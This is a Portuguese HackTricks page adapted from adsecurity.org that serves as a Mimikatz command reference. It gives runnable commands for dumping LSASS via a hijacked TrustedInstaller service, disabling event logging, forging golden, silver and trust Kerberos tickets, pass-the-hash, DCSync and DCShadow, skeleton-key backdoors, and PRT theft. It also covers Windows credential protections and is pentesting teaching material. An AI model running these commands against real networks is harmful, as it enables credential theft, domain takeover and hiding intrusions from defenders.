# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Esta página é baseada em uma página do [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Consulte o original para obter mais informações!<sup>[[3]](#references)</sup>

## LM e Clear-Text na memória

A partir do Windows 8.1 e do Windows Server 2012 R2, medidas significativas foram implementadas para proteger contra o roubo de credenciais:

- **Hashes LM e senhas em texto simples** não são mais armazenados na memória para aumentar a segurança. Uma configuração específica do registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve ser configurada com um valor DWORD de `0` para desabilitar a Digest Authentication, garantindo que as senhas em "clear-text" não sejam armazenadas em cache no LSASS.

- A **LSA Protection** foi introduzida para proteger o processo Local Security Authority (LSA) contra leitura não autorizada da memória e injeção de código. Isso é obtido marcando o LSASS como um processo protegido. A ativação da LSA Protection envolve:
1. Modificar o registro em _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, definindo `RunAsPPL` como `dword:00000001`.
2. Implementar um Group Policy Object (GPO) que imponha essa alteração no registro em todos os dispositivos gerenciados.

Apesar dessas proteções, ferramentas como o Mimikatz podem contornar a LSA Protection usando drivers específicos, embora essas ações provavelmente sejam registradas nos event logs.

Em workstations modernas, isso é ainda mais importante porque a **Credential Guard é habilitada por padrão em muitos sistemas Windows 11 22H2+ e Windows Server 2025 ingressados no domínio e que não são DCs**, enquanto o **LSASS-as-PPL é habilitado por padrão em novas instalações do Windows 11 22H2+**. Na prática, isso significa que `sekurlsa::logonpasswords` frequentemente retorna menos informações do que os tradecrafts antigos esperavam, e os operadores cada vez mais recorrem a **offline minidumps**, à **extração de chaves Kerberos (`sekurlsa::ekeys`)** ou a módulos voltados para **CloudAP/PRT**. Para o lado da proteção, consulte [Windows credentials protections](credentials-protections.md).

### Neutralizando a remoção do SeDebugPrivilege

Os administradores normalmente possuem SeDebugPrivilege, o que permite depurar programas. Esse privilégio pode ser restringido para impedir memory dumps não autorizados, uma técnica comum usada por atacantes para extrair credenciais da memória. No entanto, mesmo com esse privilégio removido, a conta TrustedInstaller ainda pode realizar memory dumps usando uma configuração de serviço personalizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Isso permite o dump da memória do `lsass.exe` para um arquivo, que pode então ser analisado em outro sistema para extrair credenciais:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opções do Mimikatz

A adulteração de logs de eventos no Mimikatz envolve duas ações principais: limpar os logs de eventos e aplicar um patch no serviço Event para impedir o registro de novos eventos. Abaixo estão os comandos para executar essas ações:

#### Limpeza de Logs de Eventos

- **Comando**: Esta ação tem como objetivo excluir os logs de eventos, dificultando o rastreamento de atividades maliciosas.
- O Mimikatz não fornece um comando direto em sua documentação padrão para limpar logs de eventos diretamente pela linha de comando. No entanto, a manipulação de logs de eventos normalmente envolve o uso de ferramentas do sistema ou scripts externos ao Mimikatz para limpar logs específicos (por exemplo, usando PowerShell ou o Visualizador de Eventos do Windows).

#### Recurso Experimental: Aplicação de Patch no Serviço Event

- **Comando**: `event::drop`
- Este comando experimental foi projetado para modificar o comportamento do Event Logging Service, impedindo efetivamente que ele registre novos eventos.
- Exemplo: `mimikatz "privilege::debug" "event::drop" exit`

- O comando `privilege::debug` garante que o Mimikatz opere com os privilégios necessários para modificar serviços do sistema.
- O comando `event::drop` então aplica um patch no serviço Event Logging.

### Ataques a Tickets Kerberos

Use os comandos abaixo como lembretes rápidos de sintaxe. As páginas dedicadas a [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) e [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contêm as informações atualizadas sobre AES/PAC/opsec.

### Criação de Golden Ticket

Um Golden Ticket permite a personificação com acesso em todo o domínio. Principais comando e parâmetros:

- Comando: `kerberos::golden`
- Parâmetros:
- `/domain`: O nome do domínio.
- `/sid`: O Security Identifier (SID) do domínio.
- `/user`: O nome de usuário a ser personificado.
- `/krbtgt`: O hash NTLM da conta de serviço KDC do domínio.
- `/ptt`: Injeta diretamente o ticket na memória.
- `/ticket`: Salva o ticket para uso posterior.

Exemplo:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets concedem acesso a serviços específicos. Principais comandos e parâmetros:

- Command: Similar ao Golden Ticket, mas direcionado a serviços específicos.
- Parameters:
- `/service`: O serviço a ser direcionado (por exemplo, cifs, http).
- Outros parâmetros semelhantes aos do Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Criação de Trust Tickets

Trust Tickets são usados para acessar recursos entre domínios, aproveitando relações de confiança. Principais comandos e parâmetros:

- Command: Semelhante ao Golden Ticket, mas para relações de confiança.
- Parameters:
- `/target`: O FQDN do domínio de destino.
- `/rc4`: O hash NTLM da conta de confiança.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos Kerberos adicionais

- **Listing Tickets**:

- Comando: `kerberos::list`
- Lista todos os tickets Kerberos da sessão atual do usuário.

- **Pass the Cache**:

- Comando: `kerberos::ptc`
- Injeta tickets Kerberos a partir de arquivos de cache.
- Exemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Comando: `kerberos::ptt`
- Permite usar um ticket Kerberos em outra sessão.
- Exemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Comando: `kerberos::purge`
- Limpa todos os tickets Kerberos da sessão.
- Útil antes de usar comandos de manipulação de tickets para evitar conflitos.

### Over-Pass-the-Hash / Pass-the-Key

Se `RC4` estiver desabilitado ou não for confiável, o Mimikatz pode aplicar **chaves Kerberos AES128/AES256** na sessão de logon atual, em vez de usar somente um hash NT. Isso geralmente é mais adequado para domínios modernos do que tratar `sekurlsa::pth` como sendo apenas NTLM.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` reutiliza o processo atual em vez de iniciar um novo console, o que é útil quando você quer executar imediatamente comandos como `lsadump::dcsync` no mesmo contexto.

### Adulteração do Active Directory

- **DCShadow**: Faz temporariamente uma máquina atuar como um DC para manipulação de objetos do AD. Consulte [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita um DC para solicitar dados de senha. Consulte [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acesso a Credenciais

- **LSADUMP::LSA**: Extrai credenciais da LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Personifica um DC usando os dados de senha de uma conta de computador.

- _Nenhum comando específico foi fornecido para NetSync no contexto original._

- **LSADUMP::SAM**: Acessa o banco de dados SAM local.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descriptografa secrets armazenados no registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Define um novo hash NTLM para um usuário.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera informações de autenticação de trust.
- `mimikatz "lsadump::trust" exit`

### Credenciais de Cloud / Entra ID

Em hosts **Entra ID** ou **hybrid-joined**, `sekurlsa::cloudap` pode expor material em cache do **Primary Refresh Token (PRT)** a partir do LSASS. Se a chave associada de Proof-of-Possession estiver protegida por software, `dpapi::cloudapkd` pode derivar o material de chave em texto claro/derivado necessário para workflows posteriores de **Pass-the-PRT**.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Isso se torna muito mais difícil quando a chave é respaldada pelo TPM, mas vale a pena verificar endpoints híbridos, pois os dados armazenados em cache pelo CloudAP podem ser mais interessantes do que a saída clássica do `wdigest`.<sup>[[2]](#references)</sup> Para a cadeia de abuso no lado cloud, consulte [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Diversos

- **MISC::Skeleton**: Injeta um backdoor no LSASS de um DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalação de Privilégios

- **PRIVILEGE::Backup**: Adquire direitos de backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtém privilégios de debug.
- `mimikatz "privilege::debug" exit`

### Dumping de Credenciais

- **SEKURLSA::LogonPasswords**: Exibe as credenciais dos usuários conectados.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extrai tickets Kerberos da memória.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulação de SID e Token

- **SID::add/modify**: Altera o SID e o SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Nenhum comando específico para modify no contexto original._

- **TOKEN::Elevate**: Faz impersonation de tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Permite múltiplas sessões RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lista sessões TS/RDP.
- _Nenhum comando específico fornecido para TS::Sessions no contexto original._

### Vault

- Extrai senhas do Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## Referências

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
